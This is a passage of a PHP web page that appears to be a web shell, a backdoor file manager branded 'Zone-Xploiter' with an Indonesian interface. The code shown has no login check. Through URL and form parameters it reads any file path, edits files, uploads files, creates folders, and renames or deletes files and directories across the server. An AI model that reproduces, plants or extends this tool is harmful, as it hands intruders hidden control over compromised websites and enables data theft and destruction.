                        <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"></path><polyline points="17 8 12 3 7 8"></polyline><line x1="12" y1="3" x2="12" y2="15"></line></svg>
                        Pilih Berkas
                    </span>
                    <span class="file-name-display" id="file-name-text">Belum ada berkas ...</span>
                </label>
            </div>
            <button type="submit" class="btn btn-primary btn-sm">
                <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"></path><polyline points="17 8 12 3 7 8"></polyline><line x1="12" y1="3" x2="12" y2="15"></line></svg>
                Unggah
            </button>
        </form>

        <form method="POST" class="tool-group">
            <input type="text" name="namafolder" placeholder="Nama folder baru..." class="input-text-compact" required>
            <button type="submit" name="buat" class="btn btn-primary btn-sm">
                <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="12" y1="5" x2="12" y2="19"></line><line x1="5" y1="12" x2="19" y2="12"></line></svg>
                Buat Folder
            </button>
        </form>
    </div>

    <?php 
    // View File Panel
    if (isset($_GET['filesrc'])): 
        $target_file = $_GET['filesrc'];
    ?>
        <div class="panel-card">
            <div class="panel-header">
                <div class="panel-title">
                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path><polyline points="14 2 14 8 20 8"></polyline></svg>
                    Lihat Berkas: <?= htmlspecialchars(basename($target_file)) ?>
                </div>
                <div style="display:flex; gap:6px;">
                    <form method="POST" action="?option&path=<?= urlencode($path) ?>" style="display:inline;">
                        <input type="hidden" name="type" value="file">
                        <input type="hidden" name="name" value="<?= htmlspecialchars(basename($target_file)) ?>">
                        <input type="hidden" name="path" value="<?= htmlspecialchars($target_file) ?>">
                        <input type="hidden" name="opt" value="edit">
                        <button type="submit" class="btn btn-primary btn-sm">Edit Berkas</button>
                    </form>
                    <a href="?path=<?= urlencode($path) ?>" class="btn btn-secondary btn-sm">Kembali</a>
                </div>
            </div>
            <textarea class="editor-textarea" readonly><?= htmlspecialchars(@file_get_contents($target_file)) ?></textarea>
        </div>

    <?php 
    // Edit File Panel
    elseif (isset($_GET['option']) && isset($_POST['opt']) && $_POST['opt'] == 'edit'): 
        $edit_path = $_POST['path'];
    ?>
        <div class="panel-card">
            <div class="panel-header">
                <div class="panel-title">
                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M11 4H4a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2v-7"></path><path d="M18.5 2.5a2.121 2.121 0 0 1 3 3L12 15l-4 1 1-4 9.5-9.5z"></path></svg>
                    Edit Berkas: <?= htmlspecialchars(basename($edit_path)) ?>
                </div>
                <a href="?path=<?= urlencode($path) ?>" class="btn btn-secondary btn-sm">Batal</a>
            </div>
            <form method="POST">
                <textarea name="src" class="editor-textarea" spellcheck="false"><?= htmlspecialchars(@file_get_contents($edit_path)) ?></textarea>
                <input type="hidden" name="path" value="<?= htmlspecialchars($edit_path) ?>">
                <input type="hidden" name="opt" value="edit">
                <div style="margin-top:10px; display:flex; justify-content:flex-end; gap:6px;">
                    <a href="?path=<?= urlencode($path) ?>" class="btn btn-secondary btn-sm">Batal</a>
                    <button type="submit" class="btn btn-primary btn-sm">Simpan Perubahan</button>
                </div>
            </form>
        </div>
    <?php endif; ?>

    <!-- File Manager Table -->
    <div class="table-card">
        <div class="table-responsive">
            <table>
                <thead>
                    <tr>
                        <th style="width: 48%;">Nama</th>
                        <th style="width: 12%;">Ukuran</th>
                        <th style="width: 13%;">Izin</th>
                        <th style="width: 15%;">Terakhir Diubah</th>
                        <th style="width: 12%; text-align: right;">Aksi</th>
                    </tr>
                </thead>
                <tbody>
                    <?php 
                    $scandir = @scandir($path);
                    if ($scandir === false) $scandir = [];

                    // Render Directories First
                    foreach ($scandir as $dir):
                        if (!is_dir("$path/$dir") || $dir == '.') continue;
                        $is_writable = is_writable("$path/$dir");
                        $dir_time = @filemtime("$path/$dir");
                        $safe_dir_path = htmlspecialchars(addslashes("$path/$dir"));
                        $safe_dir_name = htmlspecialchars(addslashes($dir));
                    ?>
                        <tr>
                            <td>
                                <div class="item-name">
                                    <span class="item-icon icon-dir">
                                        <svg width="14" height="14" viewBox="0 0 24 24" fill="currentColor"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"></path></svg>
                                    </span>
                                    <a href="?path=<?= urlencode("$path/$dir") ?>"><b><?= htmlspecialchars($dir) ?></b></a>
                                </div>
                            </td>
                            <td><span class="item-size">--</span></td>
                            <td>
                                <span class="perm-badge <?= $is_writable ? 'perm-writable' : 'perm-readonly' ?>">
                                    <?= perms("$path/$dir") ?>
                                </span>
                            </td>
                            <td><span class="item-date"><?= $dir_time ? date("Y-m-d H:i", $dir_time) : '--' ?></span></td>
                            <td style="text-align: right;">
                                <?php if ($dir !== '..'): ?>
                                    <div class="custom-dropdown">
                                        <button type="button" class="dropdown-trigger" onclick="toggleDropdown(this)">
                                            <span>Aksi</span>
                                            <svg width="9" height="9" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="6 9 12 15 18 9"></polyline></svg>
                                        </button>
                                        <div class="dropdown-menu">
                                            <a href="javascript:void(0)" class="dropdown-item" onclick="triggerRename('<?= $safe_dir_path ?>', '<?= $safe_dir_name ?>')">
                                                <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M11 4H4a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2v-7"></path><path d="M18.5 2.5a2.121 2.121 0 0 1 3 3L12 15l-4 1 1-4 9.5-9.5z"></path></svg>
                                                Rename
                                            </a>
                                            <a href="javascript:void(0)" class="dropdown-item text-danger" onclick="triggerDelete('dir', '<?= $safe_dir_path ?>', '<?= $safe_dir_name ?>')">
                                                <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="3 6 5 6 21 6"></polyline><path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2"></path></svg>
                                                Delete
                                            </a>
                                        </div>
                                    </div>
                                <?php endif; ?>
                            </td>
                        </tr>
                    <?php endforeach; ?>

                    <?php 
                    // Render Files
                    foreach ($scandir as $file):
                        if (!is_file("$path/$file")) continue;
                        $raw_size = @filesize("$path/$file");
                        if ($raw_size >= 1073741824) {
                            $fmt_size = round($raw_size / 1073741824, 2) . ' GB';
                        } elseif ($raw_size >= 1048576) {
                            $fmt_size = round($raw_size / 1048576, 2) . ' MB';
                        } elseif ($raw_size >= 1024) {
                            $fmt_size = round($raw_size / 1024, 2) . ' KB';
                        } else {
                            $fmt_size = $raw_size . ' B';
                        }
                        $is_writable = is_writable("$path/$file");
                        $file_time = @filemtime("$path/$file");
                        $safe_file_path = htmlspecialchars(addslashes("$path/$file"));
                        $safe_file_name = htmlspecialchars(addslashes($file));
                    ?>
                        <tr>
                            <td>
                                <div class="item-name">
                                    <span class="item-icon icon-file">
                                        <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path><polyline points="14 2 14 8 20 8"></polyline></svg>
                                    </span>
                                    <a href="?filesrc=<?= urlencode("$path/$file") ?>&path=<?= urlencode($path) ?>"><?= htmlspecialchars($file) ?></a>
                                </div>
                            </td>
                            <td><span class="item-size"><?= $fmt_size ?></span></td>
                            <td>
                                <span class="perm-badge <?= $is_writable ? 'perm-writable' : 'perm-readonly' ?>">
                                    <?= perms("$path/$file") ?>
                                </span>
                            </td>
                            <td><span class="item-date"><?= $file_time ? date("Y-m-d H:i", $file_time) : '--' ?></span></td>
                            <td style="text-align: right;">
                                <div class="custom-dropdown">
                                    <button type="button" class="dropdown-trigger" onclick="toggleDropdown(this)">
                                        <span>Aksi</span>
                                        <svg width="9" height="9" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="6 9 12 15 18 9"></polyline></svg>
                                    </button>
                                    <div class="dropdown-menu">
                                        <a href="javascript:void(0)" class="dropdown-item" onclick="triggerEdit('<?= $safe_file_path ?>', '<?= $safe_file_name ?>')">
                                            <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path><polyline points="14 2 14 8 20 8"></polyline></svg>
                                            Edit
                                        </a>
                                        <a href="javascript:void(0)" class="dropdown-item" onclick="triggerRename('<?= $safe_file_path ?>', '<?= $safe_file_name ?>')">
                                            <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M11 4H4a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2v-7"></path><path d="M18.5 2.5a2.121 2.121 0 0 1 3 3L12 15l-4 1 1-4 9.5-9.5z"></path></svg>
                                            Rename
                                        </a>
                                        <a href="javascript:void(0)" class="dropdown-item text-danger" onclick="triggerDelete('file', '<?= $safe_file_path ?>', '<?= $safe_file_name ?>')">
                                            <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="3 6 5 6 21 6"></polyline><path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2"></path></svg>
                                            Delete
                                        </a>
                                    </div>
                                </div>
                            </td>
                        </tr>
                    <?php endforeach; ?>
                </tbody>
            </table>
        </div>
    </div>

</div>

<!-- Footer -->
<footer class="footer">
    &copy; <?= date("Y") ?> <a href="https://github.com/Zone-Xploiter" target="_blank" rel="noopener noreferrer" style="color: #ef4444; font-weight: 700;">Zone-Xploiter</a>. All rights reserved.
</footer>

<script>
function toggleDropdown(btn) {
    var parent = btn.closest('.custom-dropdown');
    var wasActive = parent.classList.contains('active');
    closeAllDropdowns();
    if (!wasActive) {
        parent.classList.add('active');
    }
}

function closeAllDropdowns() {
    document.querySelectorAll('.custom-dropdown.active').forEach(function(d) {
        d.classList.remove('active');
    });
}

window.addEventListener('click', function(e) {
    if (!e.target.closest('.custom-dropdown')) {
        closeAllDropdowns();
    }
});

function updateFileName(input) {
    var display = document.getElementById('file-name-text');
    if (input.files && input.files.length > 0) {
        display.textContent = input.files[0].name;
        display.classList.add('has-file');
    } else {
        display.textContent = 'Belum ada berkas...';
        display.classList.remove('has-file');
    }
}

function showAboutModal() {
    if (typeof Swal !== 'undefined') {
        Swal.fire({
            title: 'About File Manager',
            imageUrl: 'https://i.ibb.co.com/yFGKyy5H/1660703905709.png',
            imageWidth: 64,
            imageHeight: 64,
            imageAlt: 'Logo',
            customClass: {
                popup: 'swal-compact',
                image: 'swal-about-img'
            },
            width: '320px',
            html: '<div style="text-align:left; font-size:12.5px; line-height:1.6; color:#d1d5db; padding:4px 6px;">' +
                  '<p style="margin-bottom:10px;"><b style="color:#fff;">V1:</b> Dibuat oleh <a href="https://github.com/wongedan123" target="_blank" rel="noopener noreferrer" style="color:#ef4444; font-weight:700; text-decoration:none;">Wongedan</a>.</p>' +
                  '<p style="margin-bottom:4px;"><b style="color:#fff;">V2:</b> Redesign & optimasi oleh <a href="https://github.com/notbell1" target="_blank" rel="noopener noreferrer" style="color:#ef4444; font-weight:700; text-decoration:none;">ZXMarchia</a>.</p>' +
                  '</div>',
            confirmButtonColor: '#ef4444',
            confirmButtonText: 'Tutup',
            background: '#121216',
            color: '#f3f4f6'
        });
    } else {
        alert("About File Manager:\nV1 oleh Wongedan (https://github.com/wongedan123)\nV2 oleh ZXMarchia (https://github.com/notbell1)");
    }
}

function triggerEdit(path, name) {
    closeAllDropdowns();
    var f = document.createElement('form');
    f.method = 'POST';
    f.action = '?option&path=' + encodeURIComponent('<?= urlencode($path) ?>');
    var p1 = document.createElement('input'); p1.type = 'hidden'; p1.name = 'opt'; p1.value = 'edit'; f.appendChild(p1);
    var p2 = document.createElement('input'); p2.type = 'hidden'; p2.name = 'path'; p2.value = path; f.appendChild(p2);
    var p3 = document.createElement('input'); p3.type = 'hidden'; p3.name = 'name'; p3.value = name; f.appendChild(p3);
    var p4 = document.createElement('input'); p4.type = 'hidden'; p4.name = 'type'; p4.value = 'file'; f.appendChild(p4);
    document.body.appendChild(f);
    f.submit();
}

function triggerRename(path, name) {
    closeAllDropdowns();
    if (typeof Swal !== 'undefined') {
        Swal.fire({
            title: 'Ganti Nama',
            input: 'text',
            inputValue: name,
            inputPlaceholder: 'Nama baru...',
            showCancelButton: true,
            confirmButtonColor: '#ef4444',
            cancelButtonColor: '#262630',
            confirmButtonText: 'Simpan',
            cancelButtonText: 'Batal',
            background: '#121216',
            color: '#f3f4f6',
            width: '300px',
            customClass: { popup: 'swal-compact' },
            inputAttributes: {
                style: 'background:#181820; border:1px solid rgba(255,255,255,0.15); color:#fff; font-size:12.5px; border-radius:6px; padding:6px 10px;'
            },
            inputValidator: function(value) {
                if (!value || !value.trim()) {
                    return 'Nama tidak boleh kosong!';
                }
            }
        }).then(function(result) {
            if (result.isConfirmed && result.value) {
                var newName = result.value.trim();
                var f = document.createElement('form');
                f.method = 'POST';
                f.action = '?option&path=' + encodeURIComponent('<?= urlencode($path) ?>');
                var p1 = document.createElement('input'); p1.type = 'hidden'; p1.name = 'opt'; p1.value = 'rename'; f.appendChild(p1);
                var p2 = document.createElement('input'); p2.type = 'hidden'; p2.name = 'path'; p2.value = path; f.appendChild(p2);
                var p3 = document.createElement('input'); p3.type = 'hidden'; p3.name = 'name'; p3.value = name; f.appendChild(p3);
                var p4 = document.createElement('input'); p4.type = 'hidden'; p4.name = 'newname'; p4.value = newName; f.appendChild(p4);
                document.body.appendChild(f);
                f.submit();
            }
        });
    } else {
        var newName = prompt('Ganti nama ' + name + ' menjadi:', name);
        if (newName && newName.trim() !== '') {
            var f = document.createElement('form');
            f.method = 'POST';
            f.action = '?option&path=' + encodeURIComponent('<?= urlencode($path) ?>');
            var p1 = document.createElement('input'); p1.type = 'hidden'; p1.name = 'opt'; p1.value = 'rename'; f.appendChild(p1);
            var p2 = document.createElement('input'); p2.type = 'hidden'; p2.name = 'path'; p2.value = path; f.appendChild(p2);
            var p3 = document.createElement('input'); p3.type = 'hidden'; p3.name = 'name'; p3.value = name; f.appendChild(p3);
            var p4 = document.createElement('input'); p4.type = 'hidden'; p4.name = 'newname'; p4.value = newName; f.appendChild(p4);
            document.body.appendChild(f);
            f.submit();
        }
    }
}

function triggerDelete(type, path, name) {
    closeAllDropdowns();
    if (typeof Swal !== 'undefined') {
        Swal.fire({
            title: 'Hapus ' + (type === 'dir' ? 'Folder' : 'Berkas') + '?',
            html: 'Yakin ingin menghapus <b style="color:#ef4444;">' + escapeHtml(name) + '</b>?<br><small style="color:#9ca3af;">Tindakan ini tidak dapat dibatalkan.</small>',
            icon: 'warning',
            showCancelButton: true,
            confirmButtonColor: '#ef4444',
            cancelButtonColor: '#262630',
            confirmButtonText: 'Ya, Hapus!',
            cancelButtonText: 'Batal',
            background: '#121216',
            color: '#f3f4f6',
            width: '280px',
            customClass: { popup: 'swal-compact' }
        }).then(function(result) {
            if (result.isConfirmed) {
                var f = document.createElement('form');
                f.method = 'POST';
                f.action = '?option&path=' + encodeURIComponent('<?= urlencode($path) ?>');
                var p1 = document.createElement('input'); p1.type = 'hidden'; p1.name = 'opt'; p1.value = 'delete'; f.appendChild(p1);
                var p2 = document.createElement('input'); p2.type = 'hidden'; p2.name = 'path'; p2.value = path; f.appendChild(p2);
                var p3 = document.createElement('input'); p3.type = 'hidden'; p3.name = 'name'; p3.value = name; f.appendChild(p3);
                var p4 = document.createElement('input'); p4.type = 'hidden'; p4.name = 'type'; p4.value = type; f.appendChild(p4);
                document.body.appendChild(f);
                f.submit();
            }
        });
    } else {
        if (confirm('Yakin ingin menghapus ' + name + '?')) {
            var f = document.createElement('form');
            f.method = 'POST';
            f.action = '?option&path=' + encodeURIComponent('<?= urlencode($path) ?>');
            var p1 = document.createElement('input'); p1.type = 'hidden'; p1.name = 'opt'; p1.value = 'delete'; f.appendChild(p1);
            var p2 = document.createElement('input'); p2.type = 'hidden'; p2.name = 'path'; p2.value = path; f.appendChild(p2);
            var p3 = document.createElement('input'); p3.type = 'hidden'; p3.name = 'name'; p3.value = name; f.appendChild(p3);
            var p4 = document.createElement('input'); p4.type = 'hidden'; p4.name = 'type'; p4.value = type; f.appendChild(p4);
            document.body.appendChild(f);
            f.submit();
        }
    }
}

function escapeHtml(text) {
    var div = document.createElement('div');
    div.innerText = text;
    return div.innerHTML;
}
</script>

<?php 
function perms($file) {
    $perms = @fileperms($file);
    if ($perms === false) return '????';
    if (($perms & 0xC000) == 0xC000) $info = 's';
    elseif (($perms & 0xA000) == 0xA000) $info = 'l';
    elseif (($perms & 0x8000) == 0x8000) $info = '-';
    elseif (($perms & 0x6000) == 0x6000) $info = 'b';
    elseif (($perms & 0x4000) == 0x4000) $info = 'd';
    elseif (($perms & 0x2000) == 0x2000) $info = 'c';
    elseif (($perms & 0x1000) == 0x1000) $info = 'p';
    else $info = 'u';
    $info .= (($perms & 0x0100) ? 'r' : '-');
    $info .= (($perms & 0x0080) ? 'w' : '-');
    $info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x' ) : (($perms & 0x0800) ? 'S' : '-'));
    $info .= (($perms & 0x0020) ? 'r' : '-');
    $info .= (($perms & 0x0010) ? 'w' : '-');
    $info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x' ) : (($perms & 0x0400) ? 'S' : '-'));
    $info .= (($perms & 0x0004) ? 'r' : '-');
    $info .= (($perms & 0x0002) ? 'w' : '-');
    $info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x' ) : (($perms & 0x0200) ? 'T' : '-'));
    return $info;
}
?>
</body>
</html>